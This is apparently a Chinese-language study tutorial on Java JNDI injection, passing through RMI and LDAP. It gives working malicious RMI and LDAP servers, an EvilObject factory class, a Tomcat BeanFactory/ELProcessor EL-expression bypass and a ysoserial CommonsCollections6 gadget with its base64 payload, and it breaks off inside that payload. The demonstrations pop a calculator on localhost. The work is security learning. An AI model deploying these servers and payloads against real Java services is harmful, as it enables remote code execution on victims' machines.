---
title: JNDI
date: 2026-08-27
---

# JNDI

## 什么是 JNDI

根据官方文档，JNDI 全称 **Java Naming and Directory Interface**，即 Java 名称与目录接口，也就是一个名字对应一个 Java 对象，一个字符串对应一个对象。

JNDI 在 JDK 中支持四种服务：

- LDAP：轻量级目录访问协议
- 通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务
- Java 远程方法调用(RMI) 注册表
- DNS 服务

前三种都是字符串对应对象，DNS 是 IP 对应域名。

### 代码与包

JNDI 主要是上面的四种服务，对应四个包和一个主包。

JNDI 接口主要分为下面 5 个包：

- `javax.naming`
- `javax.naming.directory`
- `javax.naming.event`
- `javax.naming.ldap`
- `javax.naming.spi`

其中最重要的是`javax.naming`包，包含了访问目录服务所需要的类和接口，比如 Context、Bindings、References、lookup 等。 以上述打印机服务为例，通过 JNDI 接口，用户可以透明地调用远程打印服务，伪代码如下所示：

```java
Context ctx = new InitialContext(env);
Printer printer = (Printer)ctx.lookup("myprinter");
printer.print(report);
```

JNDI 在对不同服务进行调用的时候会去调用 xxxContext 这个类，比如调用 RMI 服务的时候就是调用`RegistryContext`。

## JNDI 利用

### JNDI 结合 RMI

新建项目，把客户端和服务端分开。

服务端：

```java
package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteObj extends Remote {
    public String sayHello(String keyword) throws RemoteException;
}
```

```java
package org.example;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteObjImpl extends UnicastRemoteObject implements RemoteObj {
    public RemoteObjImpl() throws RemoteException {
    }

    @Override
    public String sayHello(String keyword) throws RemoteException {
        String upkeyword=keyword.toUpperCase();
        System.out.println(upkeyword);
        return upkeyword;
    }
}
```

```java
package org.example;

import javax.naming.InitialContext;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        initialContext.rebind("rmi://localhost:1099/remoteObj",new RemoteObjImpl());
    }
}
```

客户端：

把远程接口和实现类都复制到客户端的项目里，然后写客户端的服务：

```java
package org.example;

import javax.naming.InitialContext;

public class JNDIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}
```

#### RMI 原生漏洞

这里的 api 是 JNDI 的服务的，都是实际上调用到了 RMI 的库里，打断点调试一下证明 JNDI 的 api 实际上是调用了 RMI 的库里原生的`lookup()`方法。

断点的话，下一个在 `InitialContext.java` 的 `lookup()` 方法这里即可，开始调试。

![1](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/lookup01.png)

跟进到`lookup()`方法里去，这里`GenericURLContext`类的`lookup()`方法中又套了一个`lookup()`方法，继续跟进去。

![2](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/lookup02.png)

进去之后发现这个类是`RegistryContext`，也就是 RMI 对应`lookup()`方法的类，所以可以基本说明 JNDI 调用 RMI 服务的时候，虽然 API 是 JNDI 的，但是还是去调用了原生的 RMI 服务。

![3](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/RegistryContext.png)

所以如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。

#### 引用对象 JNDI 注入

这个漏洞与所调用的服务无关，不管是 RMI、DNS、LDAP 还是其他，都会存在这个问题。原理是在服务端调用了一个`Reference`对象。

```java
package org.example;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        //initialContext.rebind("rmi://localhost:1099/remoteObj",new RemoteObjImpl());
        Reference reference = new Reference("Calc", "Calc", "http://loaclhost:7777/");
        initialContext.rebind("rmi://localhost:1099/remoteObj",reference);
    }
}
```

看一下构造方法：

```java
public Reference(String className, String factory, String factoryLocation) {
    this(className);
    classFactory = factory;
    classFactoryLocation = factoryLocation;
}
```

第一个参数是类名，第二个参数是一个工厂名，第三个参数是工厂位置。这个工厂中会写一些代码逻辑，当我们`new Reference()`的时候就会执行工厂里的代码逻辑，所以这个设计就允许我们进行代码执行。

上面的代码中就是把我们的`Calc`的引用绑定到 RMI 上了，客户端请求一下就会弹计算器。

断点打在`lookup()`这里，看一下怎么触发恶意类然后命令执行的。

一直跟进到 RMI 原生的`lookup()`里：

![4](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/RegistryContextLookup.png)

继续往下，这里 var2 对应的是 obj 变量，把 Ref 的值赋给了它。obj 是一个 `ReferenceWrapper_Stub` 这个类，是因为这是一个 Reference。

![5](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ReferenceWrapper.png)

再往下，进入`decodeObject()`：

![6](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectInstance.png)

先进行一个判断，判断是否是`ReferenceWrapper`,也就是判断是否为 `Reference` 对象。往下是一个比较重要的方法 `getOBjectInstance()`，从名字上推测这应该是一个初始化的方法。

![7](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/builderAndReference.png)

这里到了 `getObjectInstance()` 这个方法，首先是 `builder` 的判断。往下就是关于 reference 的，这里肯定是用了 reference，强转换，将 `refInfo` 转换为 `Reference`。

![8](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectFactoryFromReference.png)

然后就是关于 ref 的，如果 reference 当中定义了 factory，就通过 `getObjectFactoryFromReference()` 方法来调用 reference 当中的 factory。

`getObjectFactoryFromReference()` 这个方法中，我们已经获取到了这个恶意类，接着执行加载类的 `loadClass()` 方法。

继续往下走，获取到 codebase，并且进行 helper.loadClass()，这里就是我们前面讲到的动态加载类的一个方法 —— URLClassLoader。

![9](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/loadClass.png)

最后在 newInstance() 这一步执行代码。

![10](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/newInstance.png)

总结一下还是比较简单的，就是 URLClassLoader 的动态类加载。攻击点就是因为客户端进行了 `lookup()` 方法的调用。这个漏洞在 jdk8u121 当中被修复，也就是 `lookup()` 方法只可以对本地进行 `lookup()` 方法的调用。

### JNDI 结合 LDAP

#### LDAP

LDAP 是一种目录服务协议，用于通过 IP 网络访问和管理分布式目录信息。

##### 目录服务

**目录服务**（Directory Service）是一种**专门存储和组织信息**的系统，主要用于**快速查找和检索**数据，而不是频繁更新。

目录服务是一个**特殊的数据库系统**，它的特点是：

| 特征         | 说明                       |
| :----------- | :------------------------- |
| **层次结构** | 树状组织数据（类似文件夹） |
| **读优化**   | 读取速度极快，写入相对慢   |
| **标准协议** | 通常用LDAP访问             |
| **分布式**   | 可以跨多台服务器复制数据   |
| **查询灵活** | 支持复杂的搜索条件         |

LDAP 目录服务的样例：

```text
dc=example,dc=org (根)
├── ou=人员/
│   └── cn=张三/
│       ├── mail: zhangsan@example.com
│       └── phone: 13800001111
└── ou=设备/
    └── cn=服务器01/
```

##### 条目(Entry)

目录中的基本存储单元，相当于数据库中的"记录"：

```text
dn: cn=张三,ou=技术部,dc=example,dc=org
objectClass: person
cn: 张三
sn: 张
mail: zhangsan@example.com
phone: 13800001111
```

##### DN(区分名)

条目的**唯一标识符**，类似文件路径：

```text
cn=张三,ou=技术部,dc=example,dc=org
└─ cn=张三        (通用名)
   └─ ou=技术部    (组织单元)
      └─ dc=example (域名组件)
         └─ dc=org   (域名组件)
```

从最具体到最不具体，从叶子到根。

##### RDN

DN 的一部分，表示相对路径：

- `cn=张三` 是相对于 `ou=技术部,dc=example,dc=org` 的RDN

##### 属性

键值对形式存储信息：

- `cn`（common name）：通用名称
- `sn`（surname）：姓氏
- `mail`：邮箱地址
- `telephoneNumber`：电话号码

##### Schema（模式）

定义哪些对象类可以有哪些属性，类似数据库的"表结构"。

##### LDAP 树状结构示例

```text
dc=example,dc=org (根)
├── ou=人员
│   ├── cn=张三
│   │   ├── mail: zhangsan@example.com
│   │   └── title: 工程师
│   └── cn=李四
│       ├── mail: lisi@example.com
│       └── title: 经理
├── ou=技术部
│   ├── cn=项目A
│   └── cn=项目B
└── ou=设备
    ├── cn=服务器01
    └── cn=打印机01
```

#### LDAP 的 JNDI 漏洞

先起一个 LDAP 的服务，这里需要先在 pom.xml 中导入 `unboundid-ldapsdk` 的依赖。

服务端的代码：

```java
package org.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;


import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=org";

    public static void main(String[] args) {
        //恶意URL，负责获取恶意类
        String url = "http://127.0.0.1:8000/#EvilObject";
        //LDAP服务器监听的端口，客户端连接的地方
        int port = 1234;
        try {
            //创建一个内存LDAP服务器，根目录是dc=example,dc=org
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            //在所有网络接口上的1234端口监听
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",   //监听器名称
                    InetAddress.getByName("0.0.0.0"),  //监听地址
                    port,    //监听端口
                    ServerSocketFactory.getDefault(),   //普通socket
                    SocketFactory.getDefault(),   //客户端socket
                    (SSLSocketFactory) SSLSocketFactory.getDefault()  //SSL工厂
            ));
			//给LDAP服务器加一个窃听器，有人查询时就触发恶意代码
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0: "+port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
	//自定义拦截器
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
		//存储恶意URL
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }
		//拦截入口
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();//获取查询的DN
            Entry e = new Entry(base);  //创建假的条目

            try {
				sendResult(result,base,e);   //发送恶意响应
            } catch (Exception e1) {

            }
        }

        protected void sendResult (InMemoryInterceptedSearchResult result,String base,Entry e) throws MalformedURLException, LDAPException {
            //构造恶意URL类，最终 turl = http://127.0.0.1:8000/EvilObject.class
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            //告诉JNDI要实例化的类名
            e.addAttribute("javaClassName","Exploit");
            //提取代码库URL
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if(refPos>0){
                cbstring = cbstring.substring(0,refPos);// "http://127.0.0.1:8000/"
            }
            //告诉JNDI去哪里下载
            e.addAttribute("javaCodeBase",cbstring);
            //标记这是JNDI引用
            e.addAttribute("objectClass","javaNamingReference");
            //要实例化的工厂名 "EvilObject"
            e.addAttribute("javaFactory",this.codebase.getRef());
            
            result.sendSearchEntry(e);// 把假条目发送给客户端
            // 告诉客户端"查询成功"
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

客户端和 RMI 的差不多，只是把服务换成了 LDAP：

```java
package org.example;

import javax.naming.InitialContext;

public class JndiLdapclient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj) initialContext.lookup("ldap://localhost:1234/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}
```

然后就是这个恶意类：

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class EvilObject implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("calc");
        return null;
    }
//    static {
//        try {
//            Runtime.getRuntime().exec("calc");
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
//    }
}
```

这个攻击其实还是攻击的 Reference，所以我们的恶意类需要实现对象工厂接口，这样才能执行其中的恶意代码。

注意一点就是，LDAP+Reference 的技巧远程加载 Factory 类不受 RMI+Reference 中的`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，`com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被设置为false，对 LDAP Reference 远程工厂类的加载增加了限制。

所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用 LDAP+Reference 的技巧来进行JNDI注入的利用。因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。

### JNDI结合 CORBA

一个简单的流程是：`resolve_str` 最终会调用到 `StubFactoryFactoryStaticImpl.createStubFactory` 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 `RMIClassLoader`，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。

## 绕过高版本 JDK 的攻击

### JDK版本 在 8u191 之前的绕过

这里的 JDK 版本是 8u121< JDK < 8u191 才能打。

绕过方法很简单，就是上面的 LDAP 的 JNDI 漏洞。在 jdk8u121 之后，RMI 默认不能加载远程类；但是在 jdk8u191 之前，LDAP 都是可以打的。

看一下 JDK 的修复源码：

```java
// 旧版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
  
 	ClassLoader parent = getContextClassLoader();  
 	ClassLoader cl =  
 	URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
	 return loadClass(className, cl);  
 }  
  
  
// 新版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
 	if ("true".equalsIgnoreCase(trustURLCodebase)) {  
 		ClassLoader parent = getContextClassLoader();  
 		ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 		return loadClass(className, cl);  
 	} else {  
 		return null;  
 	}  
 }
```

**在使用 `URLClassLoader` 加载器加载远程类之前加了个if语句检测**

根据 `trustURLCodebase`的值是否为 true 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 `trustURLCodebase` 的值是否为 true 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了。

### JDK 版本在 8u191 之后的绕过

#### 本地恶意 Class 作为 Reference Factory

这里我们的主要攻击方式是利用本地恶意类作为`Reference Factory`。

简单来说，就是要服务端本地 classpath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用。该恶意类必须实现`javax.naming.spi.ObjectFactory`接口，实现该接口的`getObjectInstance()`方法。

别人的分析中找到的是这个 `org.apache.naming.factory.BeanFactory` 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 `getObjectInstance()` 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。

**恶意服务端**

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
//ResourceRef是tomcat对Reference的扩展，允许通过BeanFactory进行更灵活的工厂方法调用
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIBypassHighJava {

    public static void main(String[] args) throws Exception{
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");
        //启动注册表用于绑定恶意对象
        Registry registry = LocateRegistry.createRegistry(1099);
        //恶意JNDI Reference
        //当JNDI创建javax.el.ELProcessor类时使用BeanFactory这个工厂来创建
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", //目标类名
                null, "", "",    //其他属性
                true,          //强制使用工厂
                "org.apache.naming.factory.BeanFactory",    //工厂类
                null);
		//控制BeanFactory
        //forceString是BeanFactory的特殊属性，用于强制把某个属性的setter映射到另一个方法
        //当设置属性x时不调用setX，而是调用eval
        //这样当BeanFactory实例化ELProcessor并设置属性x时就会调用ELProcessor.eval()方法
        ref.add(new StringRefAddr("forceString","x=eval"));
		//eval方法执行的EL表达式
        //利用EL表达式动态执行js代码
        ref.add(new StringRefAddr("x","\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"+
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
        System.out.println("[*]Evil command: calc");
        //把Reference包装成RMI可传输的远程对象
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        //绑定恶意引用
        registry.bind("Object",referenceWrapper);
    }
}
```

**JNDI 客户端**

```java
import javax.naming.InitialContext;

public class JNDIBypassHighJavaClient {
    public static void main(String[] args) throws Exception{
        String uri="rmi://localhost:1099/Object";
        InitialContext context = new InitialContext();
        context.lookup(uri);
    }
}
```

这个 payload 要实现攻击的一个条件就是恶意服务端和目标都依赖 tomcat 的 jar 包：catalina.jar、el-api.jar、jasper-el.jar。

看一下这个 payload 的攻击流程：

```text
1. 攻击者启动 RMI 服务端
   ↓
2. 绑定恶意 ResourceRef 到 RMI 注册表
   ↓
3. 受害者的 JNDI 查找 rmi://攻击者:1099/Object
   ↓
4. JNDI 获取 ResourceRef
   ↓
5. JNDI 使用 BeanFactory 工厂创建 ELProcessor 实例
   ↓
6. BeanFactory 触发 forceString，调用 ELProcessor.eval()
   ↓
7. eval() 执行恶意 EL 表达式
   ↓
8. 表达式通过 ScriptEngineManager 执行 JavaScript
   ↓
9. JavaScript 调用 ProcessBuilder 执行 calc.exe
   ↓
10. 受害者弹出计算器
```

下面分析一下服务端的代码。

##### 调试分析

断点打在`new ResourceRef()`的地方，步入：

![屏幕截图 2026-08-29 164654](/images/screenshots/屏幕截图 2026-08-29 164654.png)

先分析一个各个参数的意思：

| 参数              | 值                                        | 含义                              |
| :---------------- | :---------------------------------------- | :-------------------------------- |
| `resourceClass`   | `"javax.el.ELProcessor"`                  | 资源类名（目标类）                |
| `description`     | `null`                                    | 描述信息                          |
| `scope`           | `""`                                      | 作用域（Shareable/Unshareable）   |
| `auth`            | `""`                                      | 认证方式（Container/Application） |
| `singleton`       | `true`                                    | 是否单例                          |
| `factory`         | `"org.apache.naming.factory.BeanFactory"` | **工厂类名**                      |
| `factoryLocation` | `null`                                    | 工厂类位置（null=从本地加载）     |

这里调用的`super()`实际上调用到了`Reference`的构造方法中。后面的几个判断不需要管，和整个攻击链没什么关系。在往下看：

![屏幕截图 2026-08-29 204635](/images/screenshots/屏幕截图 2026-08-29 204635.png)

`StringRefAddr`是 JNDI 用来存储键值对数据，专门用来保存`Reference`对象的属性信息。`addrType`是键，`addr`是值。然后的`add()`就是把这个键值放到`Reference`里。add 之后：

```text
ref (ResourceRef)
├── className = "javax.el.ELProcessor"
├── classFactory = "org.apache.naming.factory.BeanFactory"
└── addrs = Vector
    ├── [0] StringRefAddr(SINGLETON, "true")
    └── [1] StringRefAddr("forceString", "x=eval")  // ← 新添加的
```

然后继续添加数据，给`x`加了一个值为 EL 恶意表达式。

![屏幕截图 2026-08-29 215154](/images/screenshots/屏幕截图 2026-08-29 215154.png)

然后看一下这个`ReferenceWrapper`，这个类把数据进行包装之后准备通过 RMI 发送出去。

然后步入整个攻击的核心。

![屏幕截图 2026-08-29 215605](/images/screenshots/屏幕截图 2026-08-29 215605.png)

先进行权限检查，然后看这个服务的名字有没有被占用，如果没有占用就绑定起来。

接下来就是看客户端。

断点打在`lookup()`，开始调试。进入`lookup()`和之前的是一样的，直接看到`RegistryContext`类的`decodeObject()`方法，其中调用了`getObjectInstance()`方法。

![1](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectInstance.png)

步入这个方法，不一样的地方在`getObjectFactoryFromReference()`。

![2](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectFactoryFromReferenceDebug.png)

跟进去看一下逻辑，发现是通过`loadClass()`来加载我们传入的`org.apache.naming.factory.BeanFactory`类的，然后新建这个类的实例并转换成`ObjectFactory`类型，也就是说，**我们传入的 Factory 类必须实现 ObjectFactory 接口类、而 `org.apache.naming.factory.BeanFactory` 正好满足这一点**。

![3](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/clasJudge.png)

继续往下跟进，可以看到`getObjectInstance()`中会判断 obj 参数是否是`ResourceRef`类实例，是的话代码才会往下走，**这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例**。

![4](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ResourceRef.png)

后面经过一系列赋值，执行`loadClass()`方法，获取`javax.el.ELProcessor`之后实例化并获取其中的`forceString`类型的内容，值就是我们构造的`x=eval`。

![5](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/forceString.png)

继续往下调试可以看到，查找`forceString`的内容中是否存在“=”，如果不存在就条用默认的`setter`，存在就取键值，键是属性名而对应的值就是指定的`setter`。所以之前设置的`forceString`的值就可以强制将 x 属性的`setter`转换成我们指定的`eval()`，这就是`BeanFactory`类可以进行利用的关键点。之后，就是获取 beanClass 即 `javax.el.ELProcessor` 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中。

![6](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/put.png)

然后就是循环来获取`ResourceRef`实例`addr`属性的元素，当获取到`addrType`为`x`时退出当前所有循环，然后调用`getContent()`来获取`x`属性对应的内容即恶意表达式。

![7](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/doWhile.png)

获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行
`"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()")`。

![8](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/invoke.png)

#### LDAP 返回序列化数据，触发本地 Gadget

LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 `obj.decodeObject()` 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。

使用 yso 生成 Commons-Collections 这条 Gadget ：

```cmd
java -jar ysoserial-master.jar CommonsCollections6 'calc' > cc6.class
```

用 Python 进行 base64 编码。

恶意 LDAP 服务器，主要是在 javaSerializedData 字段内填入刚刚生成的反序列化 payload 数据：

```java
package org.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Base64;

public class JNDIGadgetServer {
    private static final String LDAP_BASE="dc=example,dc=com";

    public static void main(String[] args) {
        String url="http://127.0.0.1:8000/#ExportObject";
        int port=1234;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            ));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor{
        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
			try {
                sendResult(result,base,e);
            } catch (LDAPException ex) {
                throw new RuntimeException(ex);
            } catch (MalformedURLException ex) {
                throw new RuntimeException(ex);
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException{
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName","Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf("#");
            if(refPos>0){
                cbstring = cbstring.substring(0, refPos);
            }

            try {
                e.addAttribute("javaSerializedData", Base64.getDecoder().decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PY